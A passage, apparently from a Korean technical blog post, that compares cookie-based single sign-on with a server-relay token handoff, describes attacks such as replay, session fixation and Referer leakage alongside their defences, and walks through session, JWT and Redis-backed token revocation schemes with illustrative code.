<span class="hljs-comment">// → 매우 복잡하고 보안 위험 존재</span>
</code></pre>
<p><strong>서버 중계 방식의 구체적인 보안 위험</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 위험 1: URL 노출 (브라우저 히스토리, 리퍼러)</span>
<span class="hljs-number">302</span> <span class="hljs-title class_">Found</span>
<span class="hljs-title class_">Location</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com/receive-token?code=temp123</span>

문제:
  - 브라우저 히스토리에 temp_code 저장
    → 사용자가 <span class="hljs-string">"뒤로가기"</span> 시 temp_code 재사용 시도 가능
  - 서버 로그에 temp_code 기록
    → 로그 유출 시 temp_code 탈취 위험
  - 리퍼러 헤더로 temp_code 유출
    → ddcn41.<span class="hljs-property">com</span>에서 외부 사이트 링크 클릭 시 <span class="hljs-title class_">Referer</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com/receive-token?code=temp123</span>

<span class="hljs-comment">// 위험 2: Race Condition (경합 조건)</span>
시나리오:
  <span class="hljs-number">1.</span> 악성 사용자가 네트워크 패킷 스니핑으로 temp_code 탈취
  <span class="hljs-number">2.</span> 정상 사용자보다 먼저 /receive-token?code=temp123 호출
  <span class="hljs-number">3.</span> 악성 사용자가 토큰 획득
  <span class="hljs-number">4.</span> 정상 사용자는 <span class="hljs-string">"이미 사용된 코드"</span> 에러 발생

방어책:
  - temp_code는 <span class="hljs-number">1</span>회용 (<span class="hljs-title class_">One</span>-<span class="hljs-title class_">Time</span> <span class="hljs-title class_">Use</span>)
  - 매우 짧은 유효시간 (<span class="hljs-number">30</span>초 ~ <span class="hljs-number">1</span>분)
  - <span class="hljs-variable constant_">IP</span> 주소 검증 (발급 시 <span class="hljs-variable constant_">IP</span>와 교환 시 <span class="hljs-variable constant_">IP</span> 일치 확인)

<span class="hljs-comment">// 위험 3: Replay Attack (재생 공격)</span>
공격 시나리오:
  <span class="hljs-number">1.</span> 공격자가 네트워크 스니핑으로 temp_code 캡처
     <span class="hljs-variable constant_">GET</span> /receive-token?code=temp123
  <span class="hljs-number">2.</span> 공격자가 캡처한 요청을 그대로 재전송
  <span class="hljs-number">3.</span> temp_code가 아직 유효하면 토큰 획득 성공

방어책:
  - <span class="hljs-title class_">Nonce</span> (<span class="hljs-title class_">Number</span> used <span class="hljs-variable constant_">ONCE</span>) 사용
  - <span class="hljs-variable constant_">HTTPS</span>로 패킷 스니핑 방지
  - 매우 짧은 유효시간 설정

<span class="hljs-comment">// 위험 4: Session Fixation (세션 고정 공격)</span>
공격 시나리오:
  <span class="hljs-number">1.</span> 공격자가 미리 temp_code 생성: temp999
  <span class="hljs-number">2.</span> 피해자에게 링크 전송:
     <span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com/receive-token?code=temp999</span>
  <span class="hljs-number">3.</span> 피해자가 클릭하면 공격자의 temp_code로 로그인
  <span class="hljs-number">4.</span> 공격자가 같은 세션으로 접근 가능

방어책:
  - temp_code 생성 시 발급자 정보 저장 (<span class="hljs-variable constant_">IP</span>, <span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>)
  - temp_code 교환 시 발급자 정보 검증
  - <span class="hljs-variable constant_">CSRF</span> 토큰 추가 검증

<span class="hljs-comment">// 위험 5: Redis/DB 보안 취약점</span>
<span class="hljs-title class_">Redis</span>에 temp_code 저장 시:
  redis.<span class="hljs-title function_">set</span>(<span class="hljs-string">'temp123'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
    <span class="hljs-attr">token</span>: <span class="hljs-string">'eyJhbGc...'</span>,
    <span class="hljs-attr">ip</span>: <span class="hljs-string">'123.45.67.89'</span>,
    <span class="hljs-attr">exp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-number">60000</span>  <span class="hljs-comment">// 1분 후 만료</span>
  }));

문제:
  - <span class="hljs-title class_">Redis</span> 메모리 덤프 유출 시 temp_code와 토큰 모두 노출
  - <span class="hljs-title class_">Redis</span> 접근 권한 탈취 시 모든 temp_code 조회 가능
  - 만료된 temp_code 청소 실패 시 메모리 누수

방어책:
  - <span class="hljs-title class_">Redis</span>에 토큰 원본 저장 금지 (<span class="hljs-title class_">Hash</span>만 저장)
  - <span class="hljs-title class_">Redis</span> 접근 권한 엄격 제한
  - <span class="hljs-variable constant_">TTL</span> 자동 만료 설정 (<span class="hljs-variable constant_">EX</span> 옵션)
  - <span class="hljs-title class_">Redis</span> 전송 시 <span class="hljs-variable constant_">TLS</span> 암호화
</code></pre>
<p><strong>쿠키 방식 (간단하고 안전)</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 1. accounts.ddcn41.com에서 로그인 성공 (Lambda 응답)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=eyJhbGc...; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>;
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: refresh_token=eyJhbGc...; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>; <span class="hljs-title class_">Max</span>-<span class="hljs-title class_">Age</span>=<span class="hljs-number">2592000</span>;

<span class="hljs-comment">// 2. ddcn41.com으로 리다이렉트</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'https://ddcn41.com'</span>;

<span class="hljs-comment">// 3. ddcn41.com에서 자동으로 쿠키 전송</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/bookings'</span>)
<span class="hljs-comment">// → Cookie: access_token=eyJhbGc... (브라우저가 자동 포함)</span>
<span class="hljs-comment">// → 추가 코드 불필요!</span>

<span class="hljs-comment">// 4. admin.ddcn41.com에서도 동일하게 동작</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.ddcn41.com/v1/admin/users'</span>)
<span class="hljs-comment">// → Cookie: access_token=eyJhbGc... (브라우저가 자동 포함)</span>
</code></pre>
<h3 id="5-토큰-저장-방식의-진화">5. 토큰 저장 방식의 진화</h3>
<h4 id="1세대-session-storage-서버-메모리">1세대: Session Storage (서버 메모리)</h4>
<pre><code>클라이언트 → 로그인 → 서버
                      ↓
                   Session ID 생성
                   메모리에 사용자 정보 저장
                      ↓
클라이언트 ← Set-Cookie: session_id=abc123

이후 요청:
클라이언트 → Cookie: session_id=abc123 → 서버
                                        ↓
                                   메모리에서 조회
                                   사용자 정보 반환
</code></pre><p><strong>문제점</strong>:</p>
<ul>
<li>❌ 서버 메모리 사용 (확장성 제약)</li>
<li>❌ 서버 재시작 시 세션 소실</li>
<li>❌ 로드밸런서 환경에서 Sticky Session 필요</li>
</ul>
<p><strong>Sticky Session (Session Affinity) 이란?</strong>³</p>
<p>로드밸런서 환경에서 동일한 사용자의 요청을 항상 같은 서버로 라우팅하는 기술입니다.</p>
<pre><code>문제 상황 (Sticky Session 없이):
┌─────────┐
│  사용자  │
└────┬────┘
     │ 1. 로그인 요청
     ▼
┌─────────────┐
│로드밸런서    │
└──┬──────┬───┘
   │      │
   ▼      ▼
┌────┐  ┌────┐
│서버A│  │서버B│
└────┘  └────┘

플로우:
  1. 사용자 로그인 → 로드밸런서 → 서버A
     서버A 메모리에 session_id=abc123 저장

  2. 사용자 API 요청 → 로드밸런서 → 서버B (랜덤 라우팅)
     ❌ 서버B 메모리에 session_id=abc123 없음
     → 401 Unauthorized 에러
     → 사용자는 분명히 로그인했는데 인증 실패!

해결 방법 1: Sticky Session 활성화
┌─────────┐
│  사용자  │
└────┬────┘
     │ Cookie: session_id=abc123
     ▼
┌─────────────┐
│로드밸런서    │  ← session_id를 보고 항상 같은 서버로 라우팅
└──┬──────────┘
   │
   ▼
┌────┐  ┌────┐
│서버A│  │서버B│  서버B는 이 사용자의 요청을 받지 않음
└────┘  └────┘

동작 원리:
  - 로드밸런서가 쿠키 또는 IP 주소 기반으로 서버 선택
  - ALB (Application Load Balancer): AWSALB 쿠키 사용
  - Nginx: ip_hash 또는 cookie 지시어 사용

장점:
  ✅ 세션 데이터 일관성 보장
  ✅ 서버 메모리 기반 세션 사용 가능

단점:
  ❌ 특정 서버에 부하 집중 가능
  ❌ 서버 다운 시 해당 서버의 모든 세션 소실
  ❌ 수평 확장 효율 저하 (특정 서버만 계속 사용)
  ❌ Auto-Scaling 시 세션 손실 (새 서버 추가/제거)

해결 방법 2: 중앙 세션 저장소 (Redis)
┌─────────┐
│  사용자  │
└────┬────┘
     │
     ▼
┌─────────────┐
│로드밸런서    │  ← 랜덤 라우팅 (Sticky Session 불필요)
└──┬──────┬───┘
   │      │
   ▼      ▼
┌────┐  ┌────┐
│서버A│  │서버B│
└─┬──┘  └──┬─┘
  │        │
  └────┬───┘
       ▼
   ┌──────┐
   │ Redis │  ← 모든 서버가 같은 세션 저장소 사용
   └──────┘

장점:
  ✅ 로드밸런서 랜덤 라우팅 가능 (부하 분산 최적화)
  ✅ 서버 다운/추가 시에도 세션 유지
  ✅ Auto-Scaling에 유리
  ✅ 수평 확장 용이

단점:
  ⚠️ Redis 의존성 (Redis 다운 시 모든 인증 불가)
  ⚠️ 네트워크 레이�시 추가 (Redis 조회 필요)

해결 방법 3: JWT Stateless (현재 방식)
┌─────────┐
│  사용자  │  JWT 토큰 = 서버 서명된 사용자 정보
└────┬────┘
     │ Authorization: Bearer eyJhbGc...
     ▼
┌─────────────┐
│로드밸런서    │  ← 랜덤 라우팅
└──┬──────┬───┘
   │      │
   ▼      ▼
┌────┐  ┌────┐
│서버A│  │서버B│  ← 둘 다 JWT 검증 가능 (Public Key 보유)
└────┘  └────┘
   │      │
   └──────┴─────→ 메모리/Redis 조회 불필요

장점:
  ✅ Sticky Session 불필요
  ✅ Redis 의존성 없음
  ✅ 완전한 Stateless (수평 확장 최적)

단점:
  ❌ 토큰 무효화 어려움 (로그아웃 즉시 반영 안 됨)
</code></pre><blockquote>
<p>³ 참조: <a href="https://docs.aws.amazon.com/prescriptive-guidance/latest/load-balancer-stickiness/alb-cookies-stickiness.html" target="_blank">AWS ALB Sticky Sessions</a></p>
</blockquote>
<p><strong>AWS ALB의 Sticky Session 설정</strong>:</p>
<pre><code class="lang-bash"><span class="hljs-comment"># ALB Target Group 설정</span>
aws elbv2 modify-target-group-attributes \
  --target-group-arn arn:aws:elasticloadbalancing:... \
  --attributes \
    Key=stickiness.enabled,Value=<span class="hljs-literal">true</span> \
    Key=stickiness.type,Value=lb_cookie \
    Key=stickiness.lb_cookie.duration_seconds,Value=86400  <span class="hljs-comment"># 1일</span>

<span class="hljs-comment"># ALB가 자동으로 AWSALB 쿠키 생성</span>
Set-Cookie: AWSALB=abc123...; Path=/; Max-Age=86400

<span class="hljs-comment"># 이후 모든 요청에서 이 쿠키를 보고 같은 서버로 라우팅</span>
</code></pre>
<h4 id="2세대-jwt-stateless-token">2세대: JWT (Stateless Token)</h4>
<pre><code>클라이언트 → 로그인 → 서버
                      ↓
                   JWT 토큰 생성
                   { sub: "user123", email: "user@example.com" }
                   Private Key로 서명
                      ↓
클라이언트 ← JWT 토큰

이후 요청:
클라이언트 → Authorization: Bearer eyJhbGc... → 서버
                                               ↓
                                          Public Key로 검증
                                          클레임 추출
                                          DB 조회 없이 인증
</code></pre><p><strong>JWT Stateless 인증의 장단점과 보완 방법</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 순수 Stateless JWT (DB/Redis 조회 없음)</span>
장점:
  ✅ 서버 메모리 사용 안 함 (확장성 우수)
  ✅ <span class="hljs-variable constant_">DB</span>/<span class="hljs-title class_">Redis</span> 조회 불필요 (빠른 검증)
  ✅ 수평 확장 용이 (어느 서버에서나 검증 가능)

단점:
  ❌ 토큰 무효화 불가 (발급 후 제어 불가)
  ❌ 강제 로그아웃 불가 (만료 시간까지 유효)
  ❌ 권한 변경 즉시 반영 안 됨 (토큰 만료 후 갱신 필요)

문제 시나리오:
  <span class="hljs-number">1.</span> 사용자가 로그아웃 → <span class="hljs-variable constant_">JWT</span>는 여전히 유효
     → 탈취된 토큰으로 접근 가능

  <span class="hljs-number">2.</span> 관리자가 사용자 권한 변경 (<span class="hljs-variable constant_">ADMIN</span> → <span class="hljs-variable constant_">USER</span>)
     → 기존 <span class="hljs-variable constant_">JWT</span>는 여전히 <span class="hljs-variable constant_">ADMIN</span> 권한 보유
     → 만료 시간(<span class="hljs-number">1</span>시간)까지 <span class="hljs-variable constant_">ADMIN</span> 권한으로 동작

  <span class="hljs-number">3.</span> 보안 사고 발생 (토큰 탈취 의심)
     → 모든 <span class="hljs-variable constant_">JWT</span> 무효화 방법 없음
     → <span class="hljs-title class_">Public</span> <span class="hljs-title class_">Key</span> 변경으로만 대응 가능 (모든 사용자 재로그인)
</code></pre>
<p><strong>Hybrid 방식: JWT + Redis/DB 토큰 관리</strong></p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 방법 1: Redis Whitelist (토큰 허용 목록)</span>
<span class="hljs-comment">// 로그인 성공 시</span>
<span class="hljs-keyword">const</span> accessToken = <span class="hljs-title function_">generateJWT</span>(userId, <span class="hljs-string">'1h'</span>);
<span class="hljs-keyword">const</span> refreshToken = <span class="hljs-title function_">generateJWT</span>(userId, <span class="hljs-string">'30d'</span>);

<span class="hljs-comment">// Redis에 토큰 저장 (Whitelist)</span>
<span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">set</span>(<span class="hljs-string">`access:<span class="hljs-subst">${userId}</span>:<span class="hljs-subst">${tokenId}</span>`</span>, accessToken, <span class="hljs-string">'EX'</span>, <span class="hljs-number">3600</span>);
<span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">set</span>(<span class="hljs-string">`refresh:<span class="hljs-subst">${userId}</span>:<span class="hljs-subst">${refreshTokenId}</span>`</span>, refreshToken, <span class="hljs-string">'EX'</span>, <span class="hljs-number">2592000</span>);

<span class="hljs-comment">// 인증 검증 시</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">authenticateRequest</span>(<span class="hljs-params">accessToken</span>) {
  <span class="hljs-comment">// 1. JWT 서명 검증 (Public Key)</span>
  <span class="hljs-keyword">const</span> payload = <span class="hljs-title function_">verifyJWT</span>(accessToken);

  <span class="hljs-comment">// 2. Redis Whitelist 확인</span>
  <span class="hljs-keyword">const</span> exists = <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">exists</span>(<span class="hljs-string">`access:<span class="hljs-subst">${payload.sub}</span>:<span class="hljs-subst">${payload.jti}</span>`</span>);
  <span class="hljs-keyword">if</span> (!exists) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Token revoked'</span>);  <span class="hljs-comment">// 로그아웃되었거나 무효화됨</span>
  }

  <span class="hljs-keyword">return</span> payload;
}

<span class="hljs-comment">// 로그아웃 시 (즉시 무효화 가능)</span>
<span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">del</span>(<span class="hljs-string">`access:<span class="hljs-subst">${userId}</span>:<span class="hljs-subst">${tokenId}</span>`</span>);
<span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">del</span>(<span class="hljs-string">`refresh:<span class="hljs-subst">${userId}</span>:<span class="hljs-subst">${refreshTokenId}</span>`</span>);

장점:
  ✅ 즉시 로그아웃 가능 (<span class="hljs-title class_">Redis</span>에서 삭제)
  ✅ 강제 로그아웃 가능 (관리자가 특정 사용자 토큰 삭제)
  ✅ 보안 사고 시 전체 무효화 가능 (<span class="hljs-title class_">Redis</span> flush)

단점:
  ⚠️ <span class="hljs-title class_">Redis</span> 조회 필요 (<span class="hljs-title class_">Stateless</span> 장점 일부 상실)
  ⚠️ <span class="hljs-title class_">Redis</span> 다운 시 인증 불가 (단일 장애점)


<span class="hljs-comment">// 방법 2: Redis Blacklist (토큰 차단 목록)</span>
<span class="hljs-comment">// 로그아웃 시</span>
<span class="hljs-keyword">const</span> payload = <span class="hljs-title function_">verifyJWT</span>(accessToken);
<span class="hljs-keyword">const</span> expiresIn = payload.<span class="hljs-property">exp</span> - <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() / <span class="hljs-number">1000</span>);

<span class="hljs-comment">// Redis에 차단된 토큰 저장 (만료 시간까지만)</span>
<span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">set</span>(<span class="hljs-string">`blacklist:<span class="hljs-subst">${payload.jti}</span>`</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'EX'</span>, expiresIn);

<span class="hljs-comment">// 인증 검증 시</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">authenticateRequest</span>(<span class="hljs-params">accessToken</span>) {
  <span class="hljs-keyword">const</span> payload = <span class="hljs-title function_">verifyJWT</span>(accessToken);

  <span class="hljs-comment">// Blacklist 확인</span>
  <span class="hljs-keyword">const</span> isBlacklisted = <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">exists</span>(<span class="hljs-string">`blacklist:<span class="hljs-subst">${payload.jti}</span>`</span>);
  <span class="hljs-keyword">if</span> (isBlacklisted) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Token revoked'</span>);
  }

  <span class="hljs-keyword">return</span> payload;
}

장점:
  ✅ 로그아웃 시에만 <span class="hljs-title class_">Redis</span> 저장 (대부분 <span class="hljs-title class_">Stateless</span> 유지)
  ✅ <span class="hljs-title class_">Redis</span> 메모리 사용량 최소화 (로그아웃한 토큰만 저장)

단점:
  ⚠️ 강제 로그아웃 어려움 (모든 활성 토큰 추적 안 함)


<span class="hljs-comment">// 방법 3: DB 기반 토큰 테이블</span>
<span class="hljs-comment">// 로그인 성공 시</span>
<span class="hljs-keyword">const</span> accessToken = <span class="hljs-title function_">generateJWT</span>(userId, <span class="hljs-string">'1h'</span>);

<span class="hljs-keyword">await</span> db.<span class="hljs-property">tokens</span>.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">user_id</span>: userId,
  <span class="hljs-attr">token_id</span>: tokenId,
  <span class="hljs-attr">type</span>: <span class="hljs-string">'access'</span>,
  <span class="hljs-attr">expires_at</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-number">3600000</span>),
  <span class="hljs-attr">is_revoked</span>: <span class="hljs-literal">false</span>
});

<span class="hljs-comment">// 인증 검증 시</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">authenticateRequest</span>(<span class="hljs-params">accessToken</span>) {
  <span class="hljs-keyword">const</span> payload = <span class="hljs-title function_">verifyJWT</span>(accessToken);

  <span class="hljs-keyword">const</span> tokenRecord = <span class="hljs-keyword">await</span> db.<span class="hljs-property">tokens</span>.<span class="hljs-title function_">findOne</span>({
    <span class="hljs-attr">token_id</span>: payload.<span class="hljs-property">jti</span>,
    <span class="hljs-attr">is_revoked</span>: <span class="hljs-literal">false</span>
  });

  <span class="hljs-keyword">if</span> (!tokenRecord) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Token revoked or not found'</span>);
  }

  <span class="hljs-keyword">return</span> payload;
}

<span class="hljs-comment">// 로그아웃 시</span>
<span class="hljs-keyword">await</span> db.<span class="hljs-property">tokens</span>.<span class="hljs-title function_">update</span>(
  { <span class="hljs-attr">token_id</span>: tokenId },
  { <span class="hljs-attr">is_revoked</span>: <span class="hljs-literal">true</span> }
);

장점:
  ✅ 영구 감사 로그 (모든 토큰 발급/무효화 기록)
  ✅ 복잡한 쿼리 가능 (사용자별, 기간별 토큰 조회)
  ✅ <span class="hljs-title class_">Redis</span> 다운 시에도 동작 (<span class="hljs-variable constant_">DB</span>만 있으면 됨)

단점:
  ❌ 매 요청마다 <span class="hljs-variable constant_">DB</span> 조회 (성능 영향)
  ❌ <span class="hljs-variable constant_">DB</span> 부하 증가 (수평 확장 어려움)
</code></pre>
<p><strong>Hybrid 방식 (JWT + token_version 기반 Redis 검증)</strong></p>
<pre><code class="lang-yaml"><span class="hljs-string">기본</span> <span class="hljs-string">방식:</span> <span class="hljs-string">Stateless</span> <span class="hljs-string">JWT</span> <span class="hljs-string">(일반</span> <span class="hljs-string">API</span> <span class="hljs-string">요청)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">대부분의</span> <span class="hljs-attr">API:</span> <span class="hljs-string">JWT</span> <span class="hljs-string">서명</span> <span class="hljs-string">검증만</span> <span class="hljs-string">수행</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">빠른</span> <span class="hljs-string">응답</span> <span class="hljs-string">속도</span> <span class="hljs-string">유지</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Redis</span> <span class="hljs-string">조회</span> <span class="hljs-string">없음</span> <span class="hljs-string">(확장성</span> <span class="hljs-string">우수)</span>

<span class="hljs-string">민감한</span> <span class="hljs-string">작업:</span> <span class="hljs-string">token_version</span> <span class="hljs-string">기반</span> <span class="hljs-string">추가</span> <span class="hljs-string">검증</span> <span class="hljs-string">(결제,</span> <span class="hljs-string">예매</span> <span class="hljs-string">히스토리</span> <span class="hljs-string">조회)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">결제</span> <span class="hljs-attr">API:</span> <span class="hljs-string">JWT</span> <span class="hljs-string">+</span> <span class="hljs-string">Redis</span> <span class="hljs-string">token_version</span> <span class="hljs-string">검증</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">예매</span> <span class="hljs-string">히스토리</span> <span class="hljs-string">조회:</span> <span class="hljs-string">JWT</span> <span class="hljs-string">+</span> <span class="hljs-string">Redis</span> <span class="hljs-string">token_version</span> <span class="hljs-string">검증</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">개인정보</span> <span class="hljs-string">변경:</span> <span class="hljs-string">JWT</span> <span class="hljs-string">+</span> <span class="hljs-string">Redis</span> <span class="hljs-string">token_version</span> <span class="hljs-string">검증</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">보안</span> <span class="hljs-string">수준</span> <span class="hljs-string">강화</span> <span class="hljs-string">(토큰</span> <span class="hljs-string">무효화</span> <span class="hljs-string">즉시</span> <span class="hljs-string">반영)</span>

<span class="hljs-string">이유:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">대부분의</span> <span class="hljs-string">요청:</span> <span class="hljs-string">Stateless</span> <span class="hljs-string">유지</span> <span class="hljs-string">(성능</span> <span class="hljs-string">최적화)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">민감한</span> <span class="hljs-string">작업:</span> <span class="hljs-string">추가</span> <span class="hljs-string">검증으로</span> <span class="hljs-string">보안</span> <span class="hljs-string">강화</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">선택적</span> <span class="hljs-string">Redis</span> <span class="hljs-string">조회</span> <span class="hljs-string">(트래픽</span> <span class="hljs-string">대비</span> <span class="hljs-string">성능</span> <span class="hljs-string">균형)</span>
</code></pre>
<p><strong>token_version 기반 검증 전략</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 1. 로그인 성공 시 token_version 발급</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">issueTokens</span>(<span class="hljs-params">userId</span>) {
  <span class="hljs-comment">// Cognito에서 JWT 발급</span>
  <span class="hljs-keyword">const</span> accessToken = <span class="hljs-keyword">await</span> cognito.<span class="hljs-title function_">initiateAuth</span>({...});

  <span class="hljs-comment">// Redis에 token_version 저장</span>
  <span class="hljs-keyword">const</span> tokenVersion = crypto.<span class="hljs-title function_">randomUUID</span>();
  <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">set</span>(<span class="hljs-string">`token_version:<span class="hljs-subst">${userId}</span>`</span>, tokenVersion, <span class="hljs-string">'EX'</span>, <span class="hljs-number">3600</span>);

  <span class="hljs-comment">// JWT payload에 token_version 포함</span>
  <span class="hljs-keyword">const</span> payload = {
    <span class="hljs-attr">sub</span>: userId,
    <span class="hljs-attr">email</span>: user.<span class="hljs-property">email</span>,
    <span class="hljs-attr">token_version</span>: tokenVersion  <span class="hljs-comment">// ← token_version 추가</span>
  };

  <span class="hljs-keyword">return</span> { accessToken, tokenVersion };
}


<span class="hljs-comment">// 2. 일반 API: JWT 서명 검증만 수행 (Redis 조회 없음)</span>
@<span class="hljs-title class_">GetMapping</span>(<span class="hljs-string">"/v1/movies"</span>)
public <span class="hljs-title class_">ResponseEntity</span>&lt;<span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Movie</span>&gt;&gt; <span class="hljs-title function_">getMovies</span>(<span class="hljs-params">@CookieValue <span class="hljs-built_in">String</span> access_token</span>) {
  <span class="hljs-comment">// JWT 서명 검증만 수행 (빠른 응답)</span>
  <span class="hljs-title class_">JwtPayload</span> payload = jwtVerifier.<span class="hljs-title function_">verify</span>(access_token);

  <span class="hljs-comment">// Redis 조회 없이 바로 응답</span>
  <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Movie</span>&gt; movies = movieService.<span class="hljs-title function_">findAll</span>();
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ResponseEntity</span>.<span class="hljs-title function_">ok</span>(movies);
}


<span class="hljs-comment">// 3. 민감한 API: JWT + token_version 검증 (Redis 조회 추가)</span>
@<span class="hljs-title class_">PostMapping</span>(<span class="hljs-string">"/v1/payments"</span>)
public <span class="hljs-title class_">ResponseEntity</span>&lt;<span class="hljs-title class_">Payment</span>&gt; <span class="hljs-title function_">createPayment</span>(<span class="hljs-params">
    @CookieValue <span class="hljs-built_in">String</span> access_token,
    @RequestBody PaymentRequest request</span>) {

  <span class="hljs-comment">// Step 1: JWT 서명 검증</span>
  <span class="hljs-title class_">JwtPayload</span> payload = jwtVerifier.<span class="hljs-title function_">verify</span>(access_token);
  <span class="hljs-title class_">String</span> userId = payload.<span class="hljs-title function_">getSub</span>();
  <span class="hljs-title class_">String</span> tokenVersion = payload.<span class="hljs-title function_">getCustomClaim</span>(<span class="hljs-string">"token_version"</span>);

  <span class="hljs-comment">// Step 2: Redis에서 token_version 검증</span>
  <span class="hljs-title class_">String</span> validVersion = redisTemplate.<span class="hljs-title function_">opsForValue</span>()
      .<span class="hljs-title function_">get</span>(<span class="hljs-string">"token_version:"</span> + userId);

  <span class="hljs-keyword">if</span> (validVersion == <span class="hljs-literal">null</span> || !validVersion.<span class="hljs-title function_">equals</span>(tokenVersion)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">"Token has been revoked"</span>);
  }

  <span class="hljs-comment">// Step 3: 결제 처리</span>
  <span class="hljs-title class_">Payment</span> payment = paymentService.<span class="hljs-title function_">processPayment</span>(userId, request);
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ResponseEntity</span>.<span class="hljs-title function_">ok</span>(payment);
}


<span class="hljs-comment">// 4. 예매 히스토리 조회: JWT + token_version 검증</span>
@<span class="hljs-title class_">GetMapping</span>(<span class="hljs-string">"/v1/bookings/history"</span>)
public <span class="hljs-title class_">ResponseEntity</span>&lt;<span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Booking</span>&gt;&gt; <span class="hljs-title function_">getBookingHistory</span>(<span class="hljs-params">
    @CookieValue <span class="hljs-built_in">String</span> access_token</span>) {

  <span class="hljs-comment">// JWT 검증</span>
  <span class="hljs-title class_">JwtPayload</span> payload = jwtVerifier.<span class="hljs-title function_">verify</span>(access_token);
  <span class="hljs-title class_">String</span> userId = payload.<span class="hljs-title function_">getSub</span>();
  <span class="hljs-title class_">String</span> tokenVersion = payload.<span class="hljs-title function_">getCustomClaim</span>(<span class="hljs-string">"token_version"</span>);

  <span class="hljs-comment">// Redis token_version 검증 (히스토리는 민감 정보)</span>
  <span class="hljs-title class_">String</span> validVersion = redisTemplate.<span class="hljs-title function_">opsForValue</span>()
      .<span class="hljs-title function_">get</span>(<span class="hljs-string">"token_version:"</span> + userId);

  <span class="hljs-keyword">if</span> (validVersion == <span class="hljs-literal">null</span> || !validVersion.<span class="hljs-title function_">equals</span>(tokenVersion)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">"Token has been revoked"</span>);
  }

  <span class="hljs-comment">// 예매 히스토리 조회</span>
  <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Booking</span>&gt; bookings = bookingService.<span class="hljs-title function_">findByUserId</span>(userId);
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ResponseEntity</span>.<span class="hljs-title function_">ok</span>(bookings);
}


<span class="hljs-comment">// 5. 로그아웃 시 token_version 무효화 (즉시 적용)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params">userId</span>) {
  <span class="hljs-comment">// Redis에서 token_version 삭제</span>
  <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">del</span>(<span class="hljs-string">`token_version:<span class="hljs-subst">${userId}</span>`</span>);

  <span class="hljs-comment">// → 민감한 API 접근 시 즉시 차단됨</span>
